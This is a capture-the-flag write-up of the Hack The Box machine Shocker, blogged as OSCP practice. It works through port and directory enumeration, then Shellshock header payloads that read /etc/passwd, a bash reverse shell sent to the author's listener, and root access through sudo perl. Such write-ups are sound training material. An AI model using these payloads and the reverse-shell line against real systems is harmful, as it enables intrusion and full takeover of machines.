---
title: Write-up Shocker on HTB
author: eMVee
date: 2022-10-22 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, CVE-2014-6271, shellshock]
render_with_liquid: false
---

It's still early in the evening and I still have some time left to hack a machine. From TJnull's OSCP list I saw the machine Shocker from Hack The Box. Based on the name, I do have a suspicion which vulnerability can be exploited. I decide to hack the machine.

## HTB - Shocker writeup
After starting the machine on HTB, an IP address was assigned. I copied the IP address and made a variable in the CLI.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip=10.129.49.36
~~~
Time to see if the machine was up and running and would respond to a ping request.
~~~
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip
PING 10.129.49.36 (10.129.49.36) 56(84) bytes of data.
64 bytes from 10.129.49.36: icmp_seq=1 ttl=63 time=17.7 ms
64 bytes from 10.129.49.36: icmp_seq=2 ttl=63 time=17.7 ms
64 bytes from 10.129.49.36: icmp_seq=3 ttl=63 time=17.1 ms

--- 10.129.49.36 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2015ms
rtt min/avg/max/mdev = 17.058/17.515/17.745/0.323 ms

~~~
The target responded to my ping request and I noticed a value of 63 in the ttl field. An indicator that this machine is running on a Linux distro.
Let's see what ports are open and what services are running on this machine. To do this I use my favorite nmap command **sudo nmap -sC -sV -T4 -A -O -p- $ip**

~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-22 18:53 CEST
Nmap scan report for 10.129.49.36
Host is up (0.017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/22%OT=80%CT=1%CU=32505%PV=Y%DS=2%DC=T%G=Y%TM=635420
OS:34%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M539ST11NW6%O2=M539ST11NW6%O3=M539NNT11NW6%O4=M539ST11NW6%O5=M539ST
OS:11NW6%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   17.36 ms 10.10.14.1
2   17.41 ms 10.129.49.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.37 seconds
~~~
Withing 30 seconds nmap showed me some results of the port scan. I notice that the SSH service is running on port 2222 and not on port 22.
On port 80 I see Apache running 2.4.18. I then make the following notes in my notes.

* Linux, probably an Ubuntu distro
* Port 80
   * HTTP
   * Apache/2.4.18
* Port 2222
   * OpenSSH 7.2p2

Based on this infomation I decided to run whatweb to identify some technologies and frameworks are used on this website.
~~~
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip
http://10.129.49.36 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.49.36]
~~~
For now, there was no new information discovered with whatweb. Time to use Nikto, because I know that it is good in finding vulnerabilities in webservers. Perhaps it would discover the vulnerability for shocker were I am looking for.

~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip           
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.49.36
+ Target Hostname:    10.129.49.36
+ Target Port:        80
+ Start Time:         2022-10-22 18:55:22 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-10-22 18:58:20 (GMT2) (178 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~
Time to see what is running on the website via the web browser.

![Image](/assets/img/WriteUp//HTB/Shocker/1.png){: width="700" height="400" }

Unfortunately, it didn't show the vulnerability I was looking for. Will my suspicion be wrong and will there be no shellshock present?
I decided to search for directories on the web server with dirsearch.
~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://$ip -e php,txt,bak

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, txt, bak | HTTP method: GET | Threads: 30 | Wordlist size: 9947

Output File: /home/emvee/.dirsearch/reports/10.129.49.36/_22-10-22_19-00-05.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-10-22_19-00-05.log

Target: http://10.129.49.36/

[19:00:05] Starting: 
[19:00:06] 403 -  298B  - /.ht_wsr.txt                                     
[19:00:06] 403 -  301B  - /.htaccess.bak1                                  
[19:00:06] 403 -  301B  - /.htaccess.save                                  
[19:00:06] 403 -  303B  - /.htaccess.sample
[19:00:06] 403 -  301B  - /.htaccess_orig
[19:00:06] 403 -  299B  - /.htaccess_sc
[19:00:06] 403 -  301B  - /.htaccess.orig
[19:00:06] 403 -  300B  - /.htaccessOLD2                                   
[19:00:06] 403 -  299B  - /.htaccessBAK
[19:00:06] 403 -  299B  - /.htaccessOLD
[19:00:06] 403 -  292B  - /.html
[19:00:06] 403 -  291B  - /.htm
[19:00:06] 403 -  302B  - /.htaccess_extra
[19:00:06] 403 -  298B  - /.httr-oauth
[19:00:06] 403 -  297B  - /.htpasswds                                      
[19:00:06] 403 -  301B  - /.htpasswd_test                                  
[19:00:18] 403 -  295B  - /cgi-bin/                                         
[19:00:25] 200 -  137B  - /index.html                                       
[19:00:37] 403 -  300B  - /server-status                                    
[19:00:37] 403 -  301B  - /server-status/                                   
                                                                             
Task Completed  
~~~
I noticed the **/cgi-bin/** directory is present, but forbidden. Might it be still vulnerable for shellshock? Time to enumerate some scripts within this directory with dirsearch.

~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://$ip/cgi-bin -e sh,pl,cgi            

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: sh, pl, cgi | HTTP method: GET | Threads: 30 | Wordlist size: 10021

Output File: /home/emvee/.dirsearch/reports/10.129.49.36/-cgi-bin_22-10-22_19-06-34.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-10-22_19-06-34.log

Target: http://10.129.49.36/cgi-bin/

[19:06:34] Starting: 
[19:06:36] 403 -  309B  - /cgi-bin/.htaccess.orig                          
[19:06:36] 403 -  309B  - /cgi-bin/.htaccess_orig                          
[19:06:36] 403 -  307B  - /cgi-bin/.htaccessBAK
[19:06:36] 403 -  308B  - /cgi-bin/.htaccessOLD2
[19:06:36] 403 -  300B  - /cgi-bin/.html
[19:06:36] 403 -  299B  - /cgi-bin/.htm                                    
[19:06:36] 403 -  306B  - /cgi-bin/.httr-oauth
[19:06:36] 403 -  305B  - /cgi-bin/.htpasswds
[19:06:36] 403 -  307B  - /cgi-bin/.htaccessOLD
[19:06:36] 403 -  306B  - /cgi-bin/.ht_wsr.txt
[19:06:36] 403 -  309B  - /cgi-bin/.htaccess.bak1
[19:06:36] 403 -  310B  - /cgi-bin/.htaccess_extra                         
[19:06:36] 403 -  309B  - /cgi-bin/.htaccess.save
[19:06:36] 403 -  309B  - /cgi-bin/.htpasswd_test
[19:06:36] 403 -  311B  - /cgi-bin/.htaccess.sample                        
[19:06:36] 403 -  307B  - /cgi-bin/.htaccess_sc                            
[19:07:12] 200 -  119B  - /cgi-bin/user.sh                                  
                                                                             
Task Completed   
~~~
Dirsearch has found a script called: **user.sh**. I've no idea what it could be. So I have to look closer with **curl** to see what I can identify.

~~~
┌──(emvee㉿kali)-[~]
└─$ curl http://$ip/cgi-bin/user.sh                              
Content-Type: text/plain

Just an uptime test script

 13:08:06 up 15 min,  0 users,  load average: 0.00, 0.02, 0.00
~~~
It looks like a Bash script is availble in the **cgi-bin**. I've no ideau how I can use this for the moment. I have to a bit of research on the internet and I've found a website with some details about pentesting cgi on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi).
While reading the article on hacktricks I noticed that nmap could detect a shellshock vulnerability as well.... So let's try it on my target on HTB.
The command what I have to use is: **nmap $ip -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh**

~~~
┌──(emvee㉿kali)-[~]
└─$ nmap $ip -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-22 19:55 CEST
Nmap scan report for 10.129.49.36
Host is up (0.028s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
|       is executing commands injected via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169

Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
~~~

Another method according hacktricks is to run the command against the user-agent with curl and adept the command with a sleep command. If the response has a delay, it is vulnerable to a shellshock exploit. The command what I use to try manually looks like this: **curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://$ip/cgi-bin/user.sh**

~~~
┌──(emvee㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://$ip/cgi-bin/user.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.129.49.36 Port 80</address>
</body></html>
~~~
It took a while before the response was shown, but I did not like the error displayed to me as an Internal Server Error. I decided to look further on the internet and I found a article on [seven layers](https://www.sevenlayers.com/index.php/125-exploiting-shellshock) about exploiting a shellshock manually. After reading the article I thought to give it a try against shocker.
To see if the exploit would work with this command a request is made to the id binary on the target. The exploit command what I will use looks like this: **curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://$ip/cgi-bin/user.sh**

~~~
┌──(emvee㉿kali)-[~]
└─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://$ip/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
~~~
The id of the user is shown to me, now let's try to cat the **/etc/passwd** file on the target before creating a reverse shell on the target.
~~~
┌──(emvee㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://$ip/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
~~~
The command shows the **/etc/passwd** content after running the command to exploit the shellshock vulnerability.
To gain a shell on the system I start a netcat listener on the machine.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
~~~
As soon as the netcat listener is active and listening on port 9999, it is time to create a reverse shell back to my listener. I use a simple Bash reverse shell which is most of the time very stable.
~~~
┌──(emvee㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.66/9999 0>&1' http://$ip/cgi-bin/user.sh
~~~
After running the command to exploit the shellshock vulnerability I have to check my netcat listener on Kali.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.129.49.36.
Ncat: Connection from 10.129.49.36:41226.
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
~~~
It looks like a connection has been established to my netcat listener. Now it's time to see who I am on the machine.
~~~
shelly@Shocker:/usr/lib/cgi-bin$ whoami;id;hostname;pwd
whoami;id;hostname;pwd
shelly
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
Shocker
/usr/lib/cgi-bin
~~~
It looks like I am shelly on the machine shocker and I am a member of a few groups as well. Before escalting the privileges I want to capture the user flag.
The user flag is stored in the user directory.
~~~
shelly@Shocker:/usr/lib/cgi-bin$ cd ~
cd ~
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
< ---- USER FLAG ---- >
shelly@Shocker:/home/shelly$ 
~~~
After capturing the user flag it's time to gain more privilges on the system. 
Let's check what privileges I have with **sudo -l**. Sometimes it requires a password to run, but if it is not needed, it is an awesome privilege to use.
~~~
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
~~~
While using my Google Fu to look for [GTFOBINS perl sudo](https://gtfobins.github.io/gtfobins/perl/#sudo) I opened the website.
GTFOBINS is a great resource for privilege escalation, that's why I used it in my search query. To spawn a shell as root with sudo I have to enter the following command according GTFObins: **sudo /usr/bin/perl -e 'exec "/bin/sh";'**

~~~
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
Shocker
cd /root
ls
root.txt
cat root.txt
< ---- ROOT FLAG ---- >
~~~
The root flag have been captured! This was a pretty easy machine.